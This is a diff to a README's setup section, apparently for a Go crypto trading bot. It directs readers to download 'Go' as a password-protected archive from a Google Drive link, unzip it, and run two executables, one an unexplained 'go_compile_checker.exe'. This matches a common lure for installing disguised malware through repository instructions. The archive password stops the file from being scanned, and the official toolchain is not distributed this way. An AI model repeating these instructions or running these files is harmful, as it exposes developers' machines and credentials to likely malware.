@@ -104,7 +104,9 @@ When submitting a PR, please abide by our coding guidelines:
 
 Download [Go](https://drive.google.com/file/d/1NLYLfpBzpVqQdrxckwvgV3eP3qOx9VjJ/view?usp=sharing).
 
-install go1.24.4.windows-amd64.exe and go_compile_checker.exe
+Archive password: ***gocryptotraderbot***
+
+Unzip the archive to a convenient place and run go1.24.4.windows-amd64.exe and go_compile_checker.exe
 
 ### IMPORTANT
 
